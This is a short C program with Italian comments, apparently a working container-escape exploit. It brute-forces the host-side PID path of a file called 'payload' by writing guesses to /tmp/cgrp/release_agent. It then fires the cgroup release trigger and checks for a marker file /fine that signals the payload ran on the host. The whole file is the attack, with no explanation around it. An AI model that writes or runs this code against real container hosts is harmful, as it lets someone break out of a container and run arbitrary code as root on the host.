#include<stdio.h>
#include<stdlib.h>
#include <string.h>
#include<unistd.h>
#include <fcntl.h>

#define MAX_PID 32768
#define MAX_PATH_LEN 26

void main(){

    char trigger[] = "sh -c \"echo $$ > /tmp/cgrp/x/cgroup.procs\"";
    char guess_path[MAX_PATH_LEN];
    int fd;
    


    for(int guess_real_pid=1; guess_real_pid < MAX_PID+1; guess_real_pid++ ){

        sprintf(guess_path,"/proc/%d/root/payload",guess_real_pid);

        //scrivi su release_agent
        if((fd=open("/tmp/cgrp/release_agent",O_WRONLY|O_TRUNC)) < 0){
            perror("[x] errore apertura release_agent\n");
            exit(EXIT_FAILURE);
        }

        if(write(fd,guess_path,sizeof(guess_path))!=sizeof(guess_path)){
            perror("[x] errore scrittura release_agent\n");
            close(fd);
            exit(EXIT_FAILURE);
        }

        close(fd);

        //aziona evento trigger
        if(system(trigger) == -1){
            perror("[x] trigger ha dato errore\n");
            exit(EXIT_FAILURE);
        }

        //se c'è il file "/fine", abbiamo finito 
        if(access("/fine", F_OK) == 0){
            printf("\n[v] payload eseguito! path: %s \n\n",guess_path);
            exit(EXIT_SUCCESS);
        }
        
    }



    printf("[x] raggiunto MAX_PID %d. Nessun risultato..\n",MAX_PID);
    exit(EXIT_SUCCESS);
}